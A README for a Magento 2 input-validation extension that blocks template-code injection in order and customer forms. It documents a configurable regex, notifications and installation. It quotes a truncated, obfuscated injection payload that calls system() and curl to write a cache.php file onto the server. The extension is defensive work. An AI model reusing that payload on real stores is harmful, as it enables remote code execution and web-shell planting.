# WaPoNe Input Fields Validator

## Extension description

Disallow random code injection in Magento 2 forms trough API or WEB requests for:
**Order Creation, Customer Creation, Customer Name Update, Customer Address Update**

Random code like:

      {{var this.getTemp lateFil ter().filt er(order)}} {{var this.getTemp lateFil ter().add AfterFil terCallb ack(system).Fil ter(cd${IFS%??}pub;curl${IFS%??}-o${IFS%??}cache.php${IFS....

The rejection mechanism is based on a **configurable** regular expression.

The default regular expression is **'/[{}<>%]/'** to reject characters like: { } < > %

It is also possible to configure a limit of characters to use only for the firstname and lastname fields validation.

## Configurations

### Configuration Section
- Enable: enable/disable module;
- Regular Expression: the regular expression to reject input values;
- Characters Limit: the limit of characters to use only for the firstname and lastname fields validation;
- Region Fields Validation: enable/disable the validation of region fields.

### Notifications Section
- Enable invalidation fields results notification: enable/disable invalidation fields results notification;
- Email addresses for invalidation fields results notification: Email addresses to receive invalidation fields results.

## Notification
The extension provides the possibility to email to configurable addresses at the end of process to notify the invalidation fields results.

## Logs
The log file is in the path: _/var/log/wapone_input_fields_validator.log_

## Installation Using Composer (recommended)
```
composer require wapone/module-input-fields-validator
```

## Contribution
Forked from [bafmaamy/Magento-FieldValidator](https://github.com/bafmaamy/Magento-FieldValidator).